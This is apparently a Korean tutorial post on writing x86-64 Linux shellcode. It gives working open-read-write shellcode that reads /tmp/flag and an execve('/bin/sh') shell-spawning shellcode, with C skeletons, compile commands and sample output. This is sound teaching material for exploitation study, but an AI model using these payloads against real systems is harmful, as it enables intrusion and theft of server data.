# **Shellcode**

<br>

### `Shellcode`는 익스플로잇을 위해 제작된 어셈블리 코드 조각을 말한다.

<br>

### 일반적으로 셸을 획득하기 위한 목적으로 셸코드를 사용해서, 특별히 '셸'이라는 접두사로 붙었다.

<br>

### 셸코드는 어셈블리어로 구성되므로 공격을 수행할 대상 아키텍처와 운영체제에 따라, 그리고 셸코드의 목적에 따라 다르게 작성되는데, 아키텍처별로 자주 사용되는 셸코드를 공유하는 사이트도 있지만 개인적인 환경 등을 완전히 반영하진 못하므로 최적의 셸코드는 상황에 따라 직접 만드는 게 낫다.

<br><br>

- - -

<br>

## **orw 셸코드 작성**

<br>

### orw 셸코드는 파일을 열고, 읽은 뒤, 화면에 출력해주는 셸코드이다.

<br>

### 얻고하자는 파일이 /tmp/flag라고 할 때, 셸코드의 동작을 C언어 형식으로 표현하면 아래와 같다.

<br>

```C
char buf[0x30];

int fd = open("/tmp/flag",RD_ONLY, NULL);
read(fd, buf, 0x30);
write(1, buf, 0x30);
```

<br>

### orw 셸코드를 작성하기 위해 알아야 하는 syscall은 아래와 같다.

<br>

|syscall|rax|arg0 (rdi)|arg1 (rsi)|arg2 (rdx)|
|:---:|:---:|:---:|:---:|:---:|
|**read**|0x00|unsigned int fd|char *buf|size_t count|
|**write**|0x01|unsigned int fd|const char *buf|side_t count|
|**open**|0x02|const char *filename|int flags|umode_t mode|

<br>

## 1. open

<br>

### 여기서 먼저 해야 할 일은 "/tmp/flag"라는 문자열을 메모리에 위치시키는 것이다. 이를 위해 `0x616c662f706d742f67(/tmp/flag)`를 스택에 push하고, rdi가 이를 가리키도록 rsp를 rdi로 옮긴다.

<br>

### O_RDONLY는 0이므로, rsi는 0으로 설정한다.

```C
#define     O_RDONLY    0
#define     O_WRONLY    1
#define     O_RDWR      2
```

<br>

### 파일을 읽을 때, mode는 의미를 갖지 않으므로 rdx는 0으로 설정 후 마지막으로 rax를 open의 syscall 값인 2로 설정한다.

<br>

```
push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp    ; rdi = "/tmp/flag"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)
```

<br>

## read

<br>

### syscall의 반환 값은 rax로 저장되는데, 즉 `open`으로 획득한 /tmp/flag의 fd는 rax에 저장된다. read의 첫 번째 인자를 이 값으로 설정해야 하므로 rax를 rdi에 대입한다.
<br>

### rsi는 파일에서 읽은 데이터를 저장할 주소를 가리키는데, 0x30만큼 읽을 것이므로 rsi에 rsp-0x30을 대입한다.

<br>

### rdx는 파일로부터 읽어낼 데이터의 길이인 0x30으로 설정한다.
### `read` syscall을 호출하기 위해 rax를 0으로 설정한다.

```
mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)
```

<br>

> ## **fd란?**
> ### **파일 서술자(File Descriptor, fd)**는 유닉스 계열의 운영체제에서 파일에 접근하는 소프트웨어에 제공하는 가상의 접근 제어자이다.
> ### 프로세스마다 고유의 서술자 테이블을 갖고 있으며, 그 안에 여러 파일 서술자를 저장하는데 각각 번호로 구별한다.
> ### 일반적으로 0번은 일반 입력(Standard INPUT, STDIN), 1번은 일반 출력(Standard OUTPUT,STDOUT), 2번은 일반 오류(Standard error, STDERR)에 할당되어 있다.
> ### 이들은 프로세스를 터미널과 연결해 주는데 그래서 우리는 키보드 입력을 통해 프로세스에 입력을 전달하고, 출력을 터미널로 받아 볼 수 있다.

<br>

## write

<br>

### 출력은 stdout으로 할 것이므로 rdi를 0x1로 설정하고, rsi와 rdx는 read에서 사용한 것을 그대로 사용, rax는 write syscall을 호출하기 위해 1로 설정한다.

<br>

```
mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```

<br>

### 위의 open, read, write를 모두 종합하면 아래와 같다.

<br>

```
push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp    ; rdi = "/tmp/flag"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)
mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)
mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```

<br><br>

- - -

<br>

## **orw 셸코드 컴파일 및 실행**

<br>

### 대부분의 운영체제는 실행 가능한 파일의 형식을 규정하고 있는데, 윈도우의 `PE`, 리눅스의 `ELF`가 대표적인 예이다.

<br>

### `ELF(Executable and Linkable Format)`는 크게 헤더와 코드, 그리고 기타 데이터로 구성되어 있는데 헤더에는 **실행에 필요한 여러 정보**가, 코드에는 **CPU가 이해할 수 있는 기계여 코드**가 적혀 있다.

<br>

### 위에서 작성한 셸코드는 아스키로 작성된 어셈블리 코드이므로, 기계어로 치환하면 CPU가 이해할 순 있으나 ELF 형식이 아니므로 리눅스에서 실행될 수 없다. 여기선 gcc 컴파일을 통해 ELF 형식으로 변형할 수 있다.

<br>

### 어셈블리 코드를 **컴파일**하는 방법에는 여러 가지가 있을 수 있는데, 그 중 스켈레톤 코드(핵심 내용이 비어있는, 기본 구조만 갖춘 코드)에 셸코드를 채우는 방식으로 컴파일 하면 아래처럼 할 수 있다.

<br>

```C
// File name: orw.c
// Compile: gcc -o orw orw.c -masm=intel
__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    "push 0x67\n"
    "mov rax, 0x616c662f706d742f \n"
    "push rax\n"
    "mov rdi, rsp    # rdi = '/tmp/flag'\n"
    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
    "xor rdx, rdx    # rdx = 0\n"
    "mov rax, 2      # rax = 2 ; syscall_open\n"
    "syscall         # open('/tmp/flag', RD_ONLY, NULL)\n"
    "\n"
    "mov rdi, rax      # rdi = fd\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
    "mov rdx, 0x30     # rdx = 0x30     ; len\n"
    "mov rax, 0x0      # rax = 0        ; syscall_read\n"
    "syscall           # read(fd, buf, 0x30)\n"
    "\n"
    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
    "syscall           # write(fd, buf, 0x30)\n"
    "\n"
    "xor rdi, rdi      # rdi = 0\n"
    "mov rax, 0x3c	   # rax = sys_exit\n"
    "syscall		   # exit(0)");
void run_sh();
int main() { run_sh(); }
```

<br>

### 이제 실행시켜보면, 먼저 작동함을 확인하기 위해 /tmp/flag파일을 생성 후 실행을 시켜보면 아래와 같다.

<br>

```bash
echo "flag{this_is_open_read_write_shellcode!}" > /tmp/flag
gcc -o orw orw.c -masm=intel
./orw
flag{this_is_open_read_write_shellcode!}
&��U
```

<br>

### 셸코드가 성공적으로 실행되어 우리가 저장한 문자열이 출력되는 것을 확인할 수 있다. 만약, 공격 대상이 되는 시스템에서 이런 셸코드를 시행시킬 수 있으면 공격 대상 서버의 자료를 유출시킬 수 있다.

<br>

### 근데, 위에서 flag만이 아닌 이상한 문자가 포함되어 있는데, 이건 **초기화 되지 않은 메모리의 사용(Use of Uninitialized Memory)** 때문이다.
<br>

### 스택은 다양한 함수들이 공유하는 메모리 자원인데, 각 함수가 자신들의 스택 프레임을 할당하여 사용하고 종료될 때 해체를 한다. 하지만, 스택에서의 해제란 사용한 영역을 0으로 초기화시키는 것이 아닌 rsp와 rbp를 호출한 함수의 것으로 이동시키는 것을 말한다.

<br>

### 즉, 어떤 함수를 해제한 후 다른 함수가 스택 프레임을 그 위에 할당 시 이전 스택 프레임의 데이터는 여전히 새로 할당한 스택 프레임에 존재하게 디는데, 우리는 이걸 **쓰레기 값(garbage data)** 라고도 말한다.

<br>

### 프로세스는 쓰레기 값 때문에 때때로 예상치 못한 동작을 하기도 하고, 해커에게 중요한 정보를 노출하기도 하므로 항상 스택이나 힙을 사용할 때 적절한 초기화 과정을 거쳐야 한다.

<br>
<br>

- - -

<br>

## **execve 셸코드**

<br>

### **셸(Shell, 껍질)** 이란 운영체제에 명령을 내리기 위해 사용되는 사용자의 인터페이스로, 운영체제의 핵심 기능을 하는 프로그램을 **커널(Kernel, 호두 속 내용물)** 이라고 하는 것과 대비된다.

<br>


![](https://velog.velcdn.com/images/younghyun/post/9381524a-22ee-4b77-be0f-cf66b986b8fd/image.png)

<br>

### 셸을 획득하면 시스템을 제어할 수 있게 되므로, 통상적으로 셸 획득을 시스템 해킹의 성공으로 여긴다.

<br>

### `execve` 셸코드는 임의의 프로그램을 실행하는 셸코드인데, 이를 이용하면 서버의 셸을 획득할 수 있다. 다른 언급없이 셸코드라고 하면 이를 의미하는 경우가 많다.

<br>

### `execve` 셸코드는 execve 시스템콜만으로 구성된다.

<br>

|syscall|rax|arg0 (rdi)|arg1 (rsi)|arg2 (rdx)|
|:---:|:---:|:---:|:---:|:---:|
|execve|0x3b|const char *filename|const char *const *argv|const char *const *envp
|

<br>

### 여기서 `argv`는 실행파일에 넘겨줄 인자, `envp`는 환경변수이다. 우리는 sh만 실행하면 되므로 다른 값들은 전부 null로 설정해도 된다.

<br>

### 리눅스에선 기본 실행 프로그램들이 /bin 디렉터리에 있으므로 우리가 실행할 sh도 여기에 저장되어 있다.

<br>

### 따라서 우리는 execve("/bin/sh", null, null)을 실행하는 것을 목표로 셸 코드를 작성하면 된다.

<br>

```
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp  ; rdi = "/bin/sh\x00"
xor rsi, rsi  ; rsi = NULL
xor rdx, rdx  ; rdx = NULL
mov rax, 0x3b ; rax = sys_execve
syscall       ; execve("/bin/sh", null, null)
```

<br>
<br>

- - -
<br>

## **execve 셸코드 컴파일 및 실행**

<br>

### 앞에서 사용한 스켙레톤 코드를 이용해 execve 셸코드를 컴파일하면 아래와 같다.

<br>

```
// File name: execve.c
// Compile Option: gcc -o execve execve.c -masm=intel
__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    "mov rax, 0x68732f6e69622f\n"
    "push rax\n"
    "mov rdi, rsp  # rdi = '/bin/sh'\n"
    "xor rsi, rsi  # rsi = NULL\n"
    "xor rdx, rdx  # rdx = NULL\n"
    "mov rax, 0x3b # rax = sys_execve\n"
    "syscall       # execve('/bin/sh', null, null)\n"
    "xor rdi, rdi   # rdi = 0\n"
    "mov rax, 0x3c	# rax = sys_exit\n"
    "syscall        # exit(0)");
void run_sh();
int main() { run_sh(); }
```

<br>
<br>

```sh
bash$ gcc -o execve execve.c -masm=intel
bash$ ./execve
sh$ id
uid=1000(dreamhack)
gid=1000(dreamhack)
group=1000(dreamhack)
```

<br>

### 실행 결과로 sh가 실행된 것을 확인할 수 있다.